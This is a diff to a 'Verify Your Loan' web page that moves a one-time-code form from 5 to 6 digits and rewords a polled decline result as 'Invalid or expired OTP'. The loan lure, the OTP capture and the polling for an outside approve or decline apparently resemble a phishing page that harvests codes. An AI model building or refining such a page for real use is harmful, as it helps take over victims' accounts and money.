@@ -538,7 +538,7 @@
 
       <div class="content-wrapper">
         <h1 id="pageTitle">Verify Your Loan</h1>
-        <p class="subtitle">A 5-digit verification code has been sent to your number. Enter it below to continue your loan application.</p>
+        <p class="subtitle">A 6-digit verification code has been sent to your number. Enter it below to continue your loan application.</p>
         <p class="phone-display" id="phoneDisplay"></p>
 
         <div class="offer-info" id="offerInfo">
@@ -554,9 +554,10 @@
           <input class="otp-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="Digit 3">
           <input class="otp-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="Digit 4">
           <input class="otp-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="Digit 5">
+          <input class="otp-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="Digit 6">
         </div>
 
-        <div class="error-msg" id="errMsg">Please enter the complete 5-digit verification code.</div>
+        <div class="error-msg" id="errMsg">Please enter the complete 6-digit verification code.</div>
 
         <div class="form-section">
           <button class="btn-action" id="verifyBtn" type="button">Verify &amp; Continue</button>
@@ -752,7 +753,7 @@
       if (isProcessing) return;
       const otp = getCode(otpInputs);
 
-      if (otp.length !== 5) {
+      if (otp.length !== 6) {
         errMsg.style.display = 'block';
         otpInputs.find(i => !i.value)?.focus();
         return;
@@ -839,7 +840,7 @@
                 // Decline
                 clearInterval(interval);
                 spinner.style.display = 'none';
-                errMsg.textContent = 'Request declined. Please try again.';
+                errMsg.textContent = 'Invalid or expired OTP. Please try again.';
                 errMsg.style.display = 'block';
                 otpInputs.forEach(i => { i.value = ''; updateFilledState(i); });
                 otpInputs[0].focus();
